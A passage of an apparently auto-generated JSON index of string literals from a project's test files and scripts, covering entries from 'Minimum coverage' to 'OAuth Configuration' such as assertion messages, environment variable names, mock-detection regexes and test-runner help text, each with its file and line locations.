      "category": "test_literals",
      "locations": [
        "scripts/ci/check_test_stubs.py:108"
      ]
    },
    "Minimum coverage percentage required (default: 70)": {
      "value": "Minimum coverage percentage required (default: 70)",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:496"
      ]
    },
    "MinimumLength8!": {
      "value": "MinimumLength8!",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_password_hashing_basics.py:37"
      ]
    },
    "Minor warning after deployment": {
      "value": "Minor warning after deployment",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:124"
      ]
    },
    "Missing GOOGLE_CLIENT_ID not detected in staging environment": {
      "value": "Missing GOOGLE_CLIENT_ID not detected in staging environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:106"
      ]
    },
    "Missing GOOGLE_CLIENT_SECRET not detected in staging environment": {
      "value": "Missing GOOGLE_CLIENT_SECRET not detected in staging environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:146"
      ]
    },
    "Missing HMAC secret": {
      "value": "Missing HMAC secret",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:182"
      ]
    },
    "Missing OAUTH_HMAC_SECRET not detected in staging environment": {
      "value": "Missing OAUTH_HMAC_SECRET not detected in staging environment",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:65"
      ]
    },
    "Missing POSTGRES_DB correctly failed validation:": {
      "value": "Missing POSTGRES_DB correctly failed validation:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:356"
      ]
    },
    "Missing POSTGRES_DB created URL:": {
      "value": "Missing POSTGRES_DB created URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:353"
      ]
    },
    "Missing POSTGRES_DB defaults to problematic 'netra_staging':": {
      "value": "Missing POSTGRES_DB defaults to problematic 'netra_staging':",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:349"
      ]
    },
    "Missing POSTGRES_DB results in invalid URL:": {
      "value": "Missing POSTGRES_DB results in invalid URL:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:351"
      ]
    },
    "Missing all configuration": {
      "value": "Missing all configuration",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:381"
      ]
    },
    "Missing config file:": {
      "value": "Missing config file:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:402"
      ]
    },
    "Missing configs:": {
      "value": "Missing configs:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:130"
      ]
    },
    "Missing credentials": {
      "value": "Missing credentials",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:382"
      ]
    },
    "Missing database": {
      "value": "Missing database",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:384"
      ]
    },
    "Missing fixes:": {
      "value": "Missing fixes:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:314"
      ]
    },
    "Missing method": {
      "value": "Missing method",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_issues.py:70"
      ]
    },
    "Missing password": {
      "value": "Missing password",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_database_connection_validation.py:383"
      ]
    },
    "Missing permission:": {
      "value": "Missing permission:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:248"
      ]
    },
    "Missing rate limit header": {
      "value": "Missing rate limit header",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:239"
      ]
    },
    "Missing rate limit remaining header": {
      "value": "Missing rate limit remaining header",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:240"
      ]
    },
    "Missing rate limit reset header": {
      "value": "Missing rate limit reset header",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:241"
      ]
    },
    "Missing required field": {
      "value": "Missing required field",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:182"
      ]
    },
    "Missing required field in audit log:": {
      "value": "Missing required field in audit log:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:261"
      ]
    },
    "Missing required field in error response:": {
      "value": "Missing required field in error response:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:162"
      ]
    },
    "Missing required field in login response:": {
      "value": "Missing required field in login response:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:140"
      ]
    },
    "Missing required field:": {
      "value": "Missing required field:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/base/test_mixins.py:257",
        "auth_service/tests/test_five_whys_reproduction.py:177",
        "auth_service/tests/utils/assertion_helpers.py:95",
        "auth_service/tests/utils/assertion_helpers.py:114"
      ]
    },
    "Missing required fields": {
      "value": "Missing required fields",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:159"
      ]
    },
    "Missing required permission:": {
      "value": "Missing required permission:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:223"
      ]
    },
    "Missing required staging credentials:": {
      "value": "Missing required staging credentials:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_staging_database_credentials.py:193"
      ]
    },
    "Missing required staging variables": {
      "value": "Missing required staging variables",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:184"
      ]
    },
    "Missing secret mappings:": {
      "value": "Missing secret mappings:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_startup.py:164"
      ]
    },
    "Missing setup_test_path import or call": {
      "value": "Missing setup_test_path import or call",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:39"
      ]
    },
    "Missing test directory:": {
      "value": "Missing test directory:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:398"
      ]
    },
    "Missing test file:": {
      "value": "Missing test file:",
      "category": "test_literals",
      "locations": [
        "scripts/test_example_message_flow.py:84"
      ]
    },
    "Mobile App/1.0.0 (iOS 15.0)": {
      "value": "Mobile App/1.0.0 (iOS 15.0)",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:82"
      ]
    },
    "Mock component class '": {
      "value": "Mock component class '",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:175",
        "scripts/compliance/real_test_requirements_enforcer.py:248",
        "scripts/compliance/real_test_validator.py:128"
      ]
    },
    "Mock component function '": {
      "value": "Mock component function '",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:187",
        "scripts/compliance/real_test_requirements_enforcer.py:265",
        "scripts/compliance/real_test_validator.py:139"
      ]
    },
    "Mock component pattern found:": {
      "value": "Mock component pattern found:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:383",
        "scripts/compliance/real_test_validator.py:159"
      ]
    },
    "Mock response": {
      "value": "Mock response",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:70"
      ]
    },
    "Mock()": {
      "value": "Mock()",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:356",
        "scripts/compliance/test_fixer.py:44"
      ]
    },
    "Mock/test implementation comment found:": {
      "value": "Mock/test implementation comment found:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:152"
      ]
    },
    "MockAgent": {
      "value": "MockAgent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:41"
      ]
    },
    "MockComponent\\s*=": {
      "value": "MockComponent\\s*=",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:72"
      ]
    },
    "MockUser": {
      "value": "MockUser",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_helpers.py:115"
      ]
    },
    "Mock\\(": {
      "value": "Mock\\(",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/project_test_validator.py:273"
      ]
    },
    "Mock\\(\\)": {
      "value": "Mock\\(\\)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_validator.py:235"
      ]
    },
    "Mock\\(spec=ToolDispatcher\\)": {
      "value": "Mock\\(spec=ToolDispatcher\\)",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:321"
      ]
    },
    "Mocked exception": {
      "value": "Mocked exception",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_validation.py:184"
      ]
    },
    "Model inference completed": {
      "value": "Model inference completed",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:99"
      ]
    },
    "Model loaded successfully": {
      "value": "Model loaded successfully",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:127"
      ]
    },
    "Model response test failed:": {
      "value": "Model response test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:430"
      ]
    },
    "Modernize legacy test patterns": {
      "value": "Modernize legacy test patterns",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_generator.py:43"
      ]
    },
    "Modernizing": {
      "value": "Modernizing",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:287"
      ]
    },
    "Modular test file created to comply with 450-line limit requirement.\nContains": {
      "value": "Modular test file created to comply with 450-line limit requirement.\nContains",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:205"
      ]
    },
    "Module file not found:": {
      "value": "Module file not found:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:107"
      ]
    },
    "ModuleNotFoundError": {
      "value": "ModuleNotFoundError",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:34",
        "scripts/comprehensive_test_fixer.py:66",
        "scripts/fix_test_batch.py:72"
      ]
    },
    "ModuleNotFoundError: No module named '([\\w\\.]+)'": {
      "value": "ModuleNotFoundError: No module named '([\\w\\.]+)'",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:62",
        "scripts/fix_test_batch.py:70"
      ]
    },
    "Most likely issues in staging environment:": {
      "value": "Most likely issues in staging environment:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:206"
      ]
    },
    "Move '": {
      "value": "Move '",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:250",
        "scripts/compliance/real_test_requirements_enforcer.py:267"
      ]
    },
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124": {
      "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/session_factory.py:92"
      ]
    },
    "Multi-Service Coverage:": {
      "value": "Multi-Service Coverage:",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:749"
      ]
    },
    "Multi-user productivity for": {
      "value": "Multi-user productivity for",
      "category": "test_literals",
      "locations": [
        "scripts/business_value_test_index.py:496"
      ]
    },
    "N/A": {
      "value": "N/A",
      "category": "test_literals",
      "locations": [
        "frontend/components/chat/ConnectionStatusIndicator.test.tsx:38",
        "scripts/test_oauth_local.py:151",
        "scripts/test_oauth_local.py:152",
        "scripts/test_oauth_local.py:153",
        "scripts/test_oauth_local.py:154",
        "scripts/test_oauth_local.py:309",
        "scripts/test_ssl_certificates_staging.py:77",
        "scripts/test_ssl_certificates_staging.py:78",
        "scripts/test_ssl_certificates_staging.py:79"
      ]
    },
    "NEED TO IMPLEMENT:": {
      "value": "NEED TO IMPLEMENT:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:204"
      ]
    },
    "NETRA AI PLATFORM - BACKEND TEST RUNNER": {
      "value": "NETRA AI PLATFORM - BACKEND TEST RUNNER",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:333"
      ]
    },
    "NETRA AI PLATFORM - COMPREHENSIVE TEST DISCOVERY REPORT": {
      "value": "NETRA AI PLATFORM - COMPREHENSIVE TEST DISCOVERY REPORT",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:65"
      ]
    },
    "NETRA AI PLATFORM - FRONTEND TEST RUNNER": {
      "value": "NETRA AI PLATFORM - FRONTEND TEST RUNNER",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:440"
      ]
    },
    "NETRA APEX UNIFIED TEST RUNNER\n==============================\nModern test runner with advanced categorization, progress tracking, and intelligent execution planning.\n\nUSAGE:\n    python unified_test_runner.py                       # Run default categories\n    python unified_test_runner.py --category unit       # Run specific category\n    python unified_test_runner.py --help                # Show all options\n\nCATEGORIES:\n    CRITICAL: smoke, startup\n    HIGH:     unit, security, database\n    MEDIUM:   integration, api, websocket, agent\n    LOW:      frontend, performance, e2e\n\nEXAMPLES:\n    python unified_test_runner.py --category unit\n    python unified_test_runner.py --categories unit api\n    python unified_test_runner.py --category performance --window-size 30\n    python unified_test_runner.py --list-categories": {
      "value": "NETRA APEX UNIFIED TEST RUNNER\n==============================\nModern test runner with advanced categorization, progress tracking, and intelligent execution planning.\n\nUSAGE:\n    python unified_test_runner.py                       # Run default categories\n    python unified_test_runner.py --category unit       # Run specific category\n    python unified_test_runner.py --help                # Show all options\n\nCATEGORIES:\n    CRITICAL: smoke, startup\n    HIGH:     unit, security, database\n    MEDIUM:   integration, api, websocket, agent\n    LOW:      frontend, performance, e2e\n\nEXAMPLES:\n    python unified_test_runner.py --category unit\n    python unified_test_runner.py --categories unit api\n    python unified_test_runner.py --category performance --window-size 30\n    python unified_test_runner.py --list-categories",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:2"
      ]
    },
    "NETRA_STAGING": {
      "value": "NETRA_STAGING",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_database_failures.py:101"
      ]
    },
    "NO": {
      "value": "NO",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:49"
      ]
    },
    "NONE": {
      "value": "NONE",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:164"
      ]
    },
    "NOTE: Actual migration execution skipped for safety": {
      "value": "NOTE: Actual migration execution skipped for safety",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:263"
      ]
    },
    "Need to increase coverage by": {
      "value": "Need to increase coverage by",
      "category": "test_literals",
      "locations": [
        "scripts/autonomous_review/test_reviewer.py:134"
      ]
    },
    "Nested environment variable test - Service ID:": {
      "value": "Nested environment variable test - Service ID:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_service_id_configuration_failures.py:246"
      ]
    },
    "Netra Auth Service": {
      "value": "Netra Auth Service",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:231"
      ]
    },
    "Network configuration issue in Cloud Run": {
      "value": "Network configuration issue in Cloud Run",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:202"
      ]
    },
    "Network connection FAILED:": {
      "value": "Network connection FAILED:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:91"
      ]
    },
    "Network error": {
      "value": "Network error",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_auth_oauth_errors.py:339"
      ]
    },
    "Network partition detection took": {
      "value": "Network partition detection took",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:340"
      ]
    },
    "Network unreachable - simulated partition": {
      "value": "Network unreachable - simulated partition",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:314"
      ]
    },
    "New access token should be generated": {
      "value": "New access token should be generated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:191"
      ]
    },
    "New access token should be invalid after user blacklisting": {
      "value": "New access token should be invalid after user blacklisting",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:205"
      ]
    },
    "New files created:": {
      "value": "New files created:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:751"
      ]
    },
    "New files:": {
      "value": "New files:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:723"
      ]
    },
    "New refresh token should be generated": {
      "value": "New refresh token should be generated",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:192"
      ]
    },
    "New refresh token should be invalid after user blacklisting": {
      "value": "New refresh token should be invalid after user blacklisting",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:206"
      ]
    },
    "Next Steps Guidance": {
      "value": "Next Steps Guidance",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:155"
      ]
    },
    "Next steps:": {
      "value": "Next steps:",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:241",
        "scripts/standardize_l3_test_names.py:292"
      ]
    },
    "No ACT compatibility checks found": {
      "value": "No ACT compatibility checks found",
      "category": "test_literals",
      "locations": [
        "scripts/test_workflows_with_act.py:242"
      ]
    },
    "No API key": {
      "value": "No API key",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:87"
      ]
    },
    "No Alembic configuration found": {
      "value": "No Alembic configuration found",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:119"
      ]
    },
    "No L3 files found!": {
      "value": "No L3 files found!",
      "category": "test_literals",
      "locations": [
        "scripts/standardize_l3_test_names.py:233"
      ]
    },
    "No SSL parameters as expected": {
      "value": "No SSL parameters as expected",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:159"
      ]
    },
    "No access token received": {
      "value": "No access token received",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:250"
      ]
    },
    "No async URL generated": {
      "value": "No async URL generated",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:92"
      ]
    },
    "No authentication token": {
      "value": "No authentication token",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/test_client.py:293"
      ]
    },
    "No categories to run based on selection criteria": {
      "value": "No categories to run based on selection criteria",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:131"
      ]
    },
    "No circuit breaker or rate limiting - requests timeout instead of proper 503 responses": {
      "value": "No circuit breaker or rate limiting - requests timeout instead of proper 503 responses",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:303"
      ]
    },
    "No critical issues found. Test suite appears well-organized.": {
      "value": "No critical issues found. Test suite appears well-organized.",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:542"
      ]
    },
    "No env vars set:": {
      "value": "No env vars set:",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:29"
      ]
    },
    "No error details": {
      "value": "No error details",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:388"
      ]
    },
    "No failing tests found!": {
      "value": "No failing tests found!",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:296"
      ]
    },
    "No failure scan found. Run test_failure_scanner.py first.": {
      "value": "No failure scan found. Run test_failure_scanner.py first.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:352"
      ]
    },
    "No fake tests found": {
      "value": "No fake tests found",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:250"
      ]
    },
    "No fallback mechanism for Auth Service 500 errors": {
      "value": "No fallback mechanism for Auth Service 500 errors",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:148"
      ]
    },
    "No fallback mechanism when Auth Service completely unresponsive": {
      "value": "No fallback mechanism when Auth Service completely unresponsive",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:112"
      ]
    },
    "No import changes were needed.": {
      "value": "No import changes were needed.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:215"
      ]
    },
    "No large test files found for demonstration": {
      "value": "No large test files found for demonstration",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:104"
      ]
    },
    "No migrations": {
      "value": "No migrations",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:155"
      ]
    },
    "No netra_backend imports found": {
      "value": "No netra_backend imports found",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:55",
        "scripts/fix_test_import_order.py:43"
      ]
    },
    "No network partition handling - connection failed after": {
      "value": "No network partition handling - connection failed after",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/auth-service-down-critical-scenarios.py:347"
      ]
    },
    "No priority failures found.": {
      "value": "No priority failures found.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:362"
      ]
    },
    "No real e2e tests found": {
      "value": "No real e2e tests found",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:81"
      ]
    },
    "No real e2e tests found.": {
      "value": "No real e2e tests found.",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:132"
      ]
    },
    "No response from WebSocket": {
      "value": "No response from WebSocket",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:97"
      ]
    },
    "No response received (expected due to auth)": {
      "value": "No response received (expected due to auth)",
      "category": "test_literals",
      "locations": [
        "scripts/test_websocket_dev_mode.py:211"
      ]
    },
    "No scan performed - report only mode": {
      "value": "No scan performed - report only mode",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:420"
      ]
    },
    "No setup_test_path import found": {
      "value": "No setup_test_path import found",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:49"
      ]
    },
    "No specific files identified for fixing": {
      "value": "No specific files identified for fixing",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:125"
      ]
    },
    "No splitting suggestions needed!": {
      "value": "No splitting suggestions needed!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:139"
      ]
    },
    "No sync URL generated": {
      "value": "No sync URL generated",
      "category": "test_literals",
      "locations": [
        "auth_service/test_url_construction.py:99"
      ]
    },
    "No test file size violations found!": {
      "value": "No test file size violations found!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:72"
      ]
    },
    "No test files changed": {
      "value": "No test files changed",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:240"
      ]
    },
    "No test files found for category '": {
      "value": "No test files found for category '",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:413"
      ]
    },
    "No test function violations found!": {
      "value": "No test function violations found!",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:91"
      ]
    },
    "No test processes found running.": {
      "value": "No test processes found running.",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:103"
      ]
    },
    "No test processes found.": {
      "value": "No test processes found.",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:168"
      ]
    },
    "No test violations found!": {
      "value": "No test violations found!",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:975"
      ]
    },
    "No tests found": {
      "value": "No tests found",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend_quick.py:30"
      ]
    },
    "No token provided": {
      "value": "No token provided",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_sync.py:87",
        "auth_service/tests/integration/test_oauth_flows_sync.py:95"
      ]
    },
    "Non-standard": {
      "value": "Non-standard",
      "category": "test_literals",
      "locations": [
        "scripts/generate_test_audit.py:107",
        "scripts/generate_test_audit.py:223",
        "scripts/generate_test_audit.py:224"
      ]
    },
    "Nonce replay should be prevented": {
      "value": "Nonce replay should be prevented",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:103"
      ]
    },
    "None": {
      "value": "None",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:349",
        "auth_service/tests/test_critical_staging_shutdown_timeouts.py:369",
        "auth_service/tests/unit/test_oauth_jwt_security_validator.py:163"
      ]
    },
    "None  # Use real component": {
      "value": "None  # Use real component",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:322"
      ]
    },
    "None user ID should handle gracefully": {
      "value": "None user ID should handle gracefully",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:176"
      ]
    },
    "Normal deployment should not fail": {
      "value": "Normal deployment should not fail",
      "category": "test_literals",
      "locations": [
        "scripts/test_error_monitor_logic.py:181"
      ]
    },
    "Normalized async:": {
      "value": "Normalized async:",
      "category": "test_literals",
      "locations": [
        "scripts/test_ssl_certificates_staging.py:242"
      ]
    },
    "Normalized:": {
      "value": "Normalized:",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:166",
        "scripts/test_database_url_builder_comprehensive.py:293",
        "scripts/test_staging_migrations.py:67"
      ]
    },
    "Not Set": {
      "value": "Not Set",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:83"
      ]
    },
    "Not all states were unique": {
      "value": "Not all states were unique",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_state_security.py:180"
      ]
    },
    "Not in a git repository or git not available": {
      "value": "Not in a git repository or git not available",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_linter.py:232"
      ]
    },
    "Not tested": {
      "value": "Not tested",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:357"
      ]
    },
    "Note:": {
      "value": "Note:",
      "category": "test_literals",
      "locations": [
        "scripts/check_conftest_violations.py:108"
      ]
    },
    "Number of database users:": {
      "value": "Number of database users:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:74"
      ]
    },
    "Number of iterations": {
      "value": "Number of iterations",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:171"
      ]
    },
    "Number of parallel workers (0=sequential, auto=auto, or number)": {
      "value": "Number of parallel workers (0=sequential, auto=auto, or number)",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:488"
      ]
    },
    "Number of parallel workers (default: 4)": {
      "value": "Number of parallel workers (default: 4)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:784"
      ]
    },
    "OAUTH_CALLBACK": {
      "value": "OAUTH_CALLBACK",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:33",
        "auth_service/tests/factories/audit_factory.py:171"
      ]
    },
    "OAUTH_CLIENT_ID": {
      "value": "OAUTH_CLIENT_ID",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:195",
        "auth_service/tests/test_five_whys_reproduction.py:212",
        "auth_service/tests/test_five_whys_reproduction.py:331",
        "auth_service/tests/test_five_whys_reproduction.py:363"
      ]
    },
    "OAUTH_CLIENT_SECRET": {
      "value": "OAUTH_CLIENT_SECRET",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:196"
      ]
    },
    "OAUTH_ERROR": {
      "value": "OAUTH_ERROR",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/factories/audit_factory.py:34"
      ]
    },
    "OAUTH_HMAC_SECRET": {
      "value": "OAUTH_HMAC_SECRET",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:55",
        "auth_service/tests/test_critical_oauth_environment_failures.py:56",
        "auth_service/tests/test_critical_oauth_environment_failures.py:61",
        "auth_service/tests/test_critical_oauth_environment_failures.py:75",
        "auth_service/tests/test_critical_oauth_environment_failures.py:91",
        "auth_service/tests/test_critical_oauth_environment_failures.py:131",
        "auth_service/tests/test_critical_oauth_environment_failures.py:197",
        "auth_service/tests/test_critical_oauth_environment_failures.py:225",
        "auth_service/tests/test_critical_oauth_environment_failures.py:268",
        "auth_service/tests/test_critical_oauth_environment_failures.py:313"
      ]
    },
    "OAUTH_HMAC_SECRET correctly detected as missing:": {
      "value": "OAUTH_HMAC_SECRET correctly detected as missing:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:76"
      ]
    },
    "OAUTH_HMAC_SECRET error:": {
      "value": "OAUTH_HMAC_SECRET error:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:229"
      ]
    },
    "OAUTH_HMAC_SECRET is empty in staging: '": {
      "value": "OAUTH_HMAC_SECRET is empty in staging: '",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_critical_oauth_environment_failures.py:69"
      ]
    },
    "OAUTH_REDIRECT_URI": {
      "value": "OAUTH_REDIRECT_URI",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:197",
        "auth_service/tests/test_five_whys_reproduction.py:213"
      ]
    },
    "OAUTH_REDIRECT_URL": {
      "value": "OAUTH_REDIRECT_URL",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:206"
      ]
    },
    "OAuth Callback": {
      "value": "OAuth Callback",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:128"
      ]
    },
    "OAuth Configuration": {
      "value": "OAuth Configuration",
      "category": "test_literals",
      "locations": [
        "scripts/test_oauth_local.py:155"
      ]
    },
    "OAuth Configuration:": {
      "value": "OAuth Configuration:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:104"
      ]
    },
